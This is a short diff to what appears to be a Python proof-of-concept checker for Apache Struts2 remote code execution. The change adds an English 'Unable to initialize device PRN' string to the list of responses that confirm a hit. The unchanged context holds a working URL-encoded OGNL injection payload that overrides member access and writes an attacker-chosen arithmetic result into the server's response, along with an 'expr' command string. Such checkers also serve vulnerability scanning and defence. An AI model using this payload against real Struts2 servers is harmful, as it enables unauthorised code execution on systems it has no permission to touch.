@@ -12,7 +12,8 @@ def poc(url):
     ran_b = random.randint(1000000, 2000000)
     ran_check = ran_a - ran_b
     lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
-    check = [ran_check, '无法初始化设备 PRN', '??????? PRN', '\Struts2-vuln-Goop', '/Struts2-vuln-Goop']
+    check = [ran_check, '无法初始化设备 PRN', '??????? PRN', '\Struts2-vuln-Goop', '/Struts2-vuln-Goop',
+             'Unable to initialize device PRN']
     poc_goop = [
         r"method%3a%23_memberAccess%3d@ognl.OgnlContext+@DEFAULT_MEMBER_ACCESS%2c%23kxlzx%3d+@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28" + str(
             ran_a) + '-' + str(ran_b) + "%29%2c%23kxlzx.close",
